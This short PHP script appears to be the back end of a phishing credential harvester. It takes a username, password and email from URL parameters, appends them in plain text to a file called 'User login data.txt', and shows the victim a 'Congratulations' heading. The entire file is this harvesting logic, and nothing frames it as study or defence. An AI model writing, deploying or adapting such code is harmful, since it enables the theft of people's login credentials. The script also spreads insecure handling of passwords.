<?php

$username = $_GET['username']??'';
$password = $_GET['password']??'';
$email = $_GET['email']??'';

$data = ("USERNAME: $username
	PASSWORD: $password
	EMAIL: $email \n\n");

$file = fopen("User login data.txt","a");
fwrite ($file,$data);
fclose  ($file);

echo "<h1>  Congratulations  </h1>"

?>